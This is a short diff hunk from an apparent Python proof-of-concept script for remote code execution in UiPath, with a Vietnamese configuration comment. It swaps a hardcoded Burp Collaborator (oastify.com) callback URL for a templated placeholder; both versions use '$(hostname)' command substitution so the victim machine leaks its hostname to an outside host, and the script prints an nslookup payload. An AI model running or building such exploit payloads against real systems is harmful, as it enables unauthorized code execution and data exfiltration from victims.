@@ -131,7 +131,8 @@ def create_uipath_poc_clean_run(domain_check, output_filename="RCE_PoC_CleanRun.
     print(f"[+] Payload: nslookup {domain_check}")
 
 # --- Cấu hình ---
-DOMAIN_TO_TEST = "http://pxq14sn2k6k5jt8oktz5tyian1tsht5i.oastify.com?a=$(hostname)" 
+DOMAIN_TO_TEST = "{domain}?a=$(hostname)" 
 
 if __name__ == "__main__":
+
     create_uipath_poc_clean_run(DOMAIN_TO_TEST)
